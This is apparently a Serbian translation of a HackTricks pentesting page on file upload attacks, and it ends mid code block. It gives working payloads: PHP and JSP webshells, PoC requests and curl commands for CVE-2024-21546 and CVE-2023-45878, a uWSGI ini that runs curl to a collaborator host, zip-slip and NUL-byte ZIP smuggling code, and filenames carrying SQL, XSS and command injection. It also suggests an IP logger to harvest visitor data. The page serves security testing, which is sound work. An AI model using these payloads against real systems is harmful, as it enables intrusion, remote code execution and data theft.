# Otpremanje fajlova

{{#include ../../banners/hacktricks-training.md}}

## Opšta metodologija za otpremanje fajlova

Drugi korisni extension-i:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, ._php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Zaobilaženje provera ekstenzija fajlova

1. Ako se primenjuju, **proverite** **prethodne ekstenzije.** Takođe testirajte koristeći neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proverite **dodavanje validne ekstenzije pre** izvršne ekstenzije (koristite prethodne ekstenzije takođe):_
- _file.png.php_
- _file.png.Php5_
3. Pokušajte da dodate **specijalne karaktere na kraju.** Možete koristiti Burp da **bruteforcuje** sve **ascii** i **Unicode** karaktere. (_Napomena: takođe možete pokušati da koristite **prethodno** pomenute **ekstenzije**_) 
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Pokušajte da zaobiđete zaštite **zavaravanjem parsera ekstenzija** na server-strani tehnikama kao što su **dupliranje** **ekstenzije** ili **dodavanje smeća** (**null** bajtova) između ekstenzija. _Takođe možete koristiti **prethodne ekstenzije** da pripremite bolji payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodajte **još jedan sloj ekstenzija** na prethodnu proveru:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Pokušajte da stavite **exec ekstenziju pre validne ekstenzije** i nadate se da je server pogrešno konfigurisan. (korisno za eksploatisanje Apache miskonfiguracija gde će bilo šta sa ekstenzijom **.php**, ali **ne nužno završeno sa .php**, izvršiti kod):
- _ex: file.php.png_
7. Korišćenje **NTFS alternate data stream (ADS)** na **Windows**. U ovom slučaju, karakter dvotačke ":" će biti umetnut posle zabranjene ekstenzije i pre dozvoljene. Kao rezultat, na serveru će biti kreiran **prazan fajl sa zabranjenom ekstenzijom** (npr. "file.asax:.jpg”). Ovaj fajl može kasnije biti izmenjen drugim tehnikama poput korišćenja njegovog short filename-a. Pattern "**::$data**” se takođe može koristiti za kreiranje ne-praznih fajlova. Stoga, dodavanje tačke posle ovog pattern-a može biti korisno za zaobilaženje daljih ograničenja (npr. "file.asp::$data.”)
8. Pokušajte da prekoračite limite imena fajla. Validna ekstenzija se iseče. Maliciozni PHP ostaje. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Neki upload handler-i trimuju ili normalizuju trailing dot karaktere iz sačuvanog imena fajla. U UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) verzijama pre 2.9.1, možete zaobići validaciju ekstenzija tako što:

- Koristite validan image MIME i magic header (npr. PNG’s `\x89PNG\r\n\x1a\n`).
- Imenovanje otpremljenog fajla sa PHP ekstenzijom praćenom tačkom, npr. `shell.php.`.
- Server skida trailing tačku i sačuva `shell.php`, koji će se izvršiti ako je postavljen u web-servirani direktorijum (default public storage kao `/storage/files/`).

Minimalni PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Zatim pristupite sačuvanoj putanji (tipično u Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Zaobilaženje Content-Type, Magic Number, Compression & Resizing

- Zaobiđite **Content-Type** provere postavljanjem **vrednosti** **Content-Type** **zaglavlja** na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Zaobiđite **magic number** proveru dodavanjem na početak fajla **bajtova prave slike** (zavarajte _file_ komandu). Ili ubacite shell u **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ili možete takođe **ubaciti payload direktno** u sliku:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Ako se na vašu sliku primenjuje **kompresija**, na primer koristeći neke standardne PHP biblioteke poput [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike možda neće biti korisne. Međutim, možete koristiti **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web stranica takođe može **menjati dimenzije** slike, koristeći na primer PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. Međutim, možete koristiti **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Još jedna tehnika za pravljenje payload-a koji **preživi promenu dimenzija slike**, koristeći PHP-GD funkciju `thumbnailImage`. Međutim, možete koristiti **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Drugi trikovi za proveru

- Pronađite ranjivost koja omogućava **preimenovanje** već otpremljenog fajla (da promenite ekstenziju).
- Pronađite **Local File Inclusion** ranjivost da biste izvršili backdoor.
- **Moguće otkrivanje informacija**:
1. Otpremite **više puta** (i u **isto vreme**) **isti fajl** sa **istim imenom**
2. Otpremite fajl sa **imenom** fajla ili foldera koji već **postoji**
3. Otpremite fajl sa **"." , "..", ili "…" kao imenom**. Na primer, u Apache na **Windows**, ako aplikacija čuva otpremljene fajlove u "/www/uploads/" direktorijumu, filename "." će kreirati fajl nazvan uploads” u "/www/" direktorijumu.
4. Otpremite fajl koji možda neće biti lako obrisan kao što je **"…:.jpg"** u **NTFS**. (Windows)
5. Otpremite fajl u **Windows** sa **nevažećim karakterima** kao što su `|<>*?”` u imenu. (Windows)
6. Otpremite fajl u **Windows** koristeći **rezervisane** (**zabranjene**) **nazive** kao što su CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, i LPT9.
- Pokušajte takođe da **otpremite izvršni fajl** (.exe) ili **.html** (manje sumnjivo) koji će **izvršavati kod** kada ga žrtva slučajno otvori.

### Posebni trikovi sa ekstenzijama

Ako pokušavate da otpremite fajlove na **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Ako pokušavate da otpremite fajlove na **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` fajlovi su kao `.jar` za java, ali za php, i mogu biti **korišćeni kao php fajl** (izvršavajući ih sa php, ili uključujući ih unutar skripta...)

Ekstenzija `.inc` se ponekad koristi za php fajlove koji se koriste samo za **import fajlova**, tako da je moguće da je neko dozvolio **izvršavanje ove ekstenzije**.

## **Jetty RCE**

Ako možete da otpremite XML fajl na Jetty server možete dobiti [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao što je pomenuto na sledećoj slici, otpremite XML fajl u `$JETTY_BASE/webapps/` i očekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Za detaljno istraživanje ove ranjivosti pogledajte originalno istraživanje: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) ranjivosti mogu se iskoristiti na uWSGI serverima ako napadač ima mogućnost da izmeni `.ini` konfiguracioni fajl. uWSGI konfiguracioni fajlovi koriste specifičnu sintaksu za uključivanje "magijskih" promenljivih, placeholder-a i operatora. Konkretno, '@' operator, korišćen kao `@(filename)`, namenjen je uključivanju sadržaja fajla. Među različitim podržanim scheme-ovima u uWSGI, "exec" scheme je naročito moćna, omogućavajući čitanje podataka iz standardnog izlaza procesa. Ova funkcionalnost može se zloupotrebiti za zlonamerne svrhe kao što su Remote Command Execution ili Arbitrary File Write/Read kada se `.ini` konfiguracioni fajl procesuira.

Razmotrite sledeći primer štetnog `uwsgi.ini` fajla, koji prikazuje različite scheme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Izvršenje payload-a se dešava tokom parsiranja konfiguracione datoteke. Da bi konfiguracija bila aktivirana i parsirana, uWSGI proces mora biti restartovan (potencijalno nakon pada ili zbog Denial of Service attack) ili datoteka mora biti podešena na auto-reload. Auto-reload funkcija, ako je omogućena, ponovo učitava datoteku u zadatim intervalima nakon detektovanja promena.

Ključno je razumeti labavu prirodu parsiranja konfiguracionih datoteka uWSGI-ja. Konkretno, pomenuti payload se može umetnuti u binarnu datoteku (npr. sliku ili PDF), što dodatno proširuje opseg potencijalne eksploatacije.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Neautentifikovani endpoint u Gibbon LMS omogućava arbitrary file write unutar web root-a, što dovodi do pre-auth RCE ubacivanjem PHP fajla. Ranljive verzije: do i uključujući 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Obavezni parametri:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignoriše type/name, base64-dekoduje ostatak)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: bilo koja neprazna vrednost se prihvata (npr. `0000000001`)

Minimalni PoC za upis i čitanje fajla:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Postavi minimalni webshell i izvrši komande:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Napomene:
- The handler performs `base64_decode($_POST["img"])` after splitting by `;` and `,`, then writes bytes to `$absolutePath . '/' . $_POST['path']` without validating extension/type.
- Rezultujući kod se izvršava kao korisnik web servisa (npr. XAMPP Apache na Windows).

Reference za ovaj bug uključuju usd HeroLab advisory i NVD entry. Pogledajte sekciju References ispod.

## **wget File Upload/SSRF Trick**

Ponekad možete otkriti da server koristi **`wget`** za **download files** i da možete **indicate** **URL**. U tim slučajevima, kod može proveravati da li je ekstenzija preuzetih fajlova na whitelisti kako bi se osiguralo da će biti preuzeti samo dozvoljeni fajlovi. Međutim, **this check can be bypassed.**\
The **maximum** length of a **filename** in **linux** is **255**, međutim, **wget** skraćuje imena fajlova na **236** karaktera. Možete **download a file called "A"*232+".php"+".gif"**, ovo ime fajla će **bypass** **check** (kao u ovom primeru **".gif"** je **valid** ekstenzija) ali `wget` će **rename** fajl u **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **druga opcija** o kojoj možda razmišljate da zaobiđete ovu proveru jeste da naterate **HTTP server da preusmeri na drugu datoteku**, pa će početni URL proći proveru, a zatim će wget preuzeti preusmerenu datoteku pod novim imenom. Ovo **neće raditi** **osim ako** wget nije pokrenut sa **parametrom** `--trust-server-names` zato što **wget će preuzeti preusmerenu stranicu pod imenom datoteke naznačenim u originalnom URL-u**.

### Bekstvo iz upload direktorijuma pomoću NTFS junctions (Windows)

(Za ovaj napad biće vam potreban lokalni pristup Windows mašini) Kada se uploads čuvaju u per-user podfolderima na Windows-u (npr. C:\Windows\Tasks\Uploads\<id>\) i vi kontrolišete kreiranje/brisanje tog podfoldera, možete ga zameniti directory junction-om koji pokazuje na osetljivu lokaciju (npr. webroot). Naknadni uploads će biti upisani u ciljnu putanju, omogućavajući izvršavanje koda ako cilj tumači server‑side code.

Primer toka za preusmeravanje uploads u XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Napomene
- mklink /J kreira NTFS directory junction (reparse point). Nalog web servera mora pratiti junction i imati dozvolu za pisanje u destinaciji.
- Ovo preusmerava proizvoljna pisanja fajlova; ako destinacija izvršava skripte (PHP/ASP), ovo postaje RCE.
- Odbrane: ne dozvoljavajte da writable upload roots budu pod kontrolom napadača pod C:\Windows\Tasks ili slično; blokirajte kreiranje junction-a; validirajte ekstenzije na serverskoj strani; čuvajte upload-ovane fajlove na zasebnom volumenu ili sa deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Neki upload/ingest handler-i zapisuju raw request body na filesystem path koji se konstruiše iz query parametara pod kontrolom korisnika. Ako handler takođe podržava Content-Encoding: gzip i ne kanonizuje/validira destination path, možete kombinovati directory traversal sa gzipped payload-om da upišete proizvoljne bajtove u direktorijum koji služi web sadržaj i dobijete RCE (npr. ubacivanjem JSP u Tomcat’s webapps).

Generički tok eksploatacije:
- Pripremite svoj server-side payload (npr. minimalni JSP webshell) i gzip-kompresujte bajtove.
- Pošaljite POST gde path parametar (npr. token) sadrži traversal koji izlazi iz predviđenog foldera, a file označava ime fajla koje će se sačuvati. Postavite Content-Type: application/octet-stream i Content-Encoding: gzip; telo je kompresovani payload.
- Posetite zapisani fajl da biste pokrenuli izvršavanje.

Ilustrativni zahtev:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Zatim pokrenite:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Beleške
- Ciljne putanje variraju u zavisnosti od instalacije (npr., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ u nekim stack-ovima). Bilo koji web-izložen folder koji izvršava JSP će raditi.
- Burp Suite’s Hackvertor ekstenzija može proizvesti ispravno gzip telo iz vašeg payload-a.
- Ovo je čisti pre-auth arbitrary file write → RCE obrazac; ne oslanja se na multipart parsing.

Mitigacije
- Odredite destinacije za upload na serverskoj strani; nikada ne verujte fragmentima putanja koje šalju klijenti.
- Kanonizujte i obezbedite da se rešeni put zadrži unutar allow-listed osnovnog direktorijuma.
- Skladištite upload-ove na neizvršnom volumenu i zabranite izvršavanje skripti iz writable putanja.

## Alati

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) je moćan alat dizajniran da pomogne Pentesterima i Bug Hunterima u testiranju file upload mehanizama. Koristi razne bug bounty tehnike da pojednostavi proces identifikovanja i eksploatisanja ranjivosti, obezbeđujući temeljne procene web aplikacija.

### Kvarjenje upload indeksa zbog snprintf kvirkova (istorijski)

Neki legacy upload handler-i koji koriste `snprintf()` ili slične da izgrade multi-file nizove iz jednog file upload-a mogu biti prevareni da falsifikuju `_FILES` strukturu. Zbog neusklađenosti i skraćivanja u ponašanju `snprintf()`, pažljivo konstruisan pojedinačni upload može izgledati kao više indeksiranih fajlova na serverskoj strani, zbunjujući logiku koja pretpostavlja strogi oblik (npr., tretira ga kao multi-file upload i bira nesigurne grane). Iako danas nišan, ovaj obrazac “index corruption” povremeno se vraća u CTF-ovima i starijim codebase-ovima.

## Od File upload do drugih ranjivosti

- Postavite **filename** na `../../../tmp/lol.png` i pokušajte da postignete **path traversal**
- Postavite **filename** na `sleep(10)-- -.jpg` i možda ćete moći da izazovete **SQL injection**
- Postavite **filename** na `<svg onload=alert(document.domain)>` da biste postigli XSS
- Postavite **filename** na `; sleep 10;` da testirate neku command injection (više [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Ako možete navesti web server da preuzme sliku sa URL-a, možete pokušati da zloupotrebite [SSRF](../ssrf-server-side-request-forgery/index.html). Ako će ta **image** biti **saved** na nekom **public** sajtu, možete ukazati URL sa [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specijalno izrađeni PDF-ovi za XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Ako možete upload-ovati PDF-ove, možete pripremiti neki PDF koji će izvršiti proizvoljan JS prateći date indikacije.
- Otpremite sadržaj \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) da proverite da li server ima neki **antivirus**
- Proverite da li postoji neki **size limit** pri uploadovanju fajlova

Evo top 10 liste stvari koje možete postići upload-ovanjem (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magični header bajtovi

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## ZIP/Tar fajl koji se automatski dekompresuje pri uploadu

Ako možete upload-ovati ZIP koji će biti dekompresovan na serveru, možete uraditi 2 stvari:

### Symlink

Otpremite arhivu koja sadrži soft linkove ka drugim fajlovima, zatim, pristupajući dekompresovanim fajlovima pristupićete povezanim fajlovima:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresija u različite foldere

Neočekivano kreiranje fajlova u direktorijumima tokom dekompresije predstavlja značajan problem. Uprkos početnim pretpostavkama da ovaj mehanizam može štititi od OS-level command execution kroz malicious file uploads, podrška za hijerarhijsko kompresovanje i mogućnosti directory traversal formata ZIP arhive mogu biti iskorišćene. Ovo omogućava napadačima da zaobiđu ograničenja i pobegnu iz sigurnih upload direktorijuma manipulišući dekompresionom funkcionalnošću ciljne aplikacije.

Automatizovani exploit za izradu takvih fajlova dostupan je na [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Alat se može koristiti na sledeći način:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatno, **symlink trick with evilarc** je opcija. Ako želite da ciljate fajl kao što je `/flag.txt`, trebalo bi da kreirate symlink ka tom fajlu na vašem sistemu. To osigurava da evilarc ne naiđe na greške tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje zlonamernog zip fajla:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Za više detalja **pogledajte originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP kod koji izvršava komande prosleđene kroz promenljivu `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Više fajlova se kreira i pravi se zip arhiva koja sadrži te fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Imena fajlova unutar zip-a se izmenjuju pomoću vi ili heks editora, menjajući "xxA" u "../" da bi se prešlo u nadređene direktorijume.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Kada backend validira ZIP unose koristeći PHP-ov ZipArchive, ali ekstrakcija zapisuje na fajl sistem koristeći sirova imena, možete ubaciti nedozvoljenu ekstenziju tako što ćete u polja imena fajla umetnuti NUL (0x00). ZipArchive tretira ime unosa kao C‑string i skraćuje ga na prvom NUL-u; fajl sistem upisuje puno ime, zanemarujući sve posle NUL-a.

Opšti tok:
- Pripremite legitimni container fajl (npr. validan PDF) koji ugrađuje malu PHP stub u stream tako da magic/MIME ostane PDF.
- Imenujte ga npr. `shell.php..pdf`, zipujte, zatim heks‑izmenite ZIP lokalni header i central directory polje imena da zamenite prvu `.` posle `.php` sa `0x00`, što rezultuje `shell.php\x00.pdf`.
- Validatori koji se oslanjaju na ZipArchive će “videti” `shell.php .pdf` i dozvoliti ga; extractor upisuje `shell.php` na disk, što vodi do RCE ako je upload folder izvršan.

Minimalni PoC koraci:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Beleške
- Promenite OBA pojavljivanja imena fajla (u lokalnom i centralnom direktorijumu). Neki alati dodaju i dodatni data descriptor unos – prilagodite sva polja imena ako su prisutna.
- payload fajl mora i dalje proći server‑side magic/MIME sniffing. Ugradnja PHP-a u PDF stream održava header važećim.
- Radi kada enum/validation path i extraction/write path ne slažu u načinu rukovanja stringovima.

### Stacked/concatenated ZIPs (parser disagreement)

Spajanjem dve validne ZIP datoteke dobija se blob u kojem se različiti parseri fokusiraju na različite EOCD zapise. Mnogi alati lociraju poslednji End Of Central Directory (EOCD), dok neke biblioteke (npr. ZipArchive u određenim workflow-ima) mogu parsirati prvi archive koji pronađu. Ako validation nabraja prvi archive, a extraction koristi drugi alat koji poštuje poslednji EOCD, benigni archive može proći provere dok maliciozni biva ekstrahovan.

PoC:
```bash
# Build two separate archives
